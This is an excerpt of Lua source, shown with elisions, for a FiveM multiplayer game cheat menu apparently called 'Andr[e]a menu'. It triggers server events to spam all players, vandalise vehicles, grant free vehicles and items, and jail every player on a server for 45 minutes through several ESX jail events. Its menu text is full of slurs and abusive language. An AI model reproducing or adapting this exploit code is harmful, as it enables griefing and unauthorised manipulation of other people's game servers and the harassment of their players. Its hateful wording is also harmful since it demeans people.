...
av('~h~Welcome to Andr[e]a menu bitch', true)
...
function RapeAllFunc()
    for bD = 0, 9 do
        TriggerServerEvent(
            ...
            '^' .. bD .. 'You Got Raped by Andr[e]a Menu'
        )
    end
    Citizen.CreateThread(
        function()
            ...
            if fuckallcars then
                for ay in EnumerateVehicles() do
                    if not IsPedAPlayer(GetPedInVehicleSeat(ay, -1)) then
                        ...
                        SetVehicleNumberPlateText(ay, 'Suca')
...
Citizen.CreateThread(
    function()
        ...
        LynxEvo.SetSubTitle('LynxX', 'hey asshole this is Andr[€]a menu')
        ...
        LynxEvo.CreateSubMenu('ESXGive', 'LuaMenu', 'ESX Give Item')
        ...
        while bw do
            ...
            if LynxEvo.IsMenuOpened('LynxX') then
                ...
                elseif LynxEvo.MenuButton('~h~~p~# ~y~Panic Gay', 'crds') then break
                end
                LynxEvo.Display()
            ...
            elseif LynxEvo.IsMenuOpened('ESXCustom') then
                ...
                elseif LynxEvo.Button('~h~~b~Buy ~s~a vehicle for ~g~free') then
                    cv()
                elseif LynxEvo.Button('~w~~h~Give ~r~Item') then
                	local b = KeyboardInput('Enter name of item', '', 100)
                	local c = KeyboardInput('Enter the number', '', 100)
                	TriggerServerEvent('esx_vehicleshop:putStockItems', b, c)
				end
                LynxEvo.Display()
            ...
            elseif LynxEvo.IsMenuOpened('crds') then
                if LynxEvo.Button('~h~~p~#~s~ go away') then
                    av('~h~~o~bro this shit gay~s~.', false)
                    av('Im a fag?', false)
                    av('xd ye', false)
                elseif LynxEvo.Button('~h~~p~#~s~ gay') then
                elseif LynxEvo.Button('~h~~p~#~s~ nword~') then
                end
                LynxEvo.Display()
...
RegisterCommand(
    ...
    function(eA, eB, eC)
        ...
        AmbulancePlayers()
        for i = 0, 128 do
            TriggerServerEvent('esx-qalle-jail:jailPlayer', GetPlayerServerId(i), 5000, 'Heyyyyyyyyyyyy bitch')
            TriggerServerEvent('esx_jailer:sendToJail', GetPlayerServerId(i), 45 * 60)
            TriggerServerEvent('esx_jail:sendToJail', GetPlayerServerId(i), 45 * 60)
            TriggerServerEvent('js:jailuser', GetPlayerServerId(i), 45 * 60, 'A fiji de na mignottara')
        end
    end,
    false
)
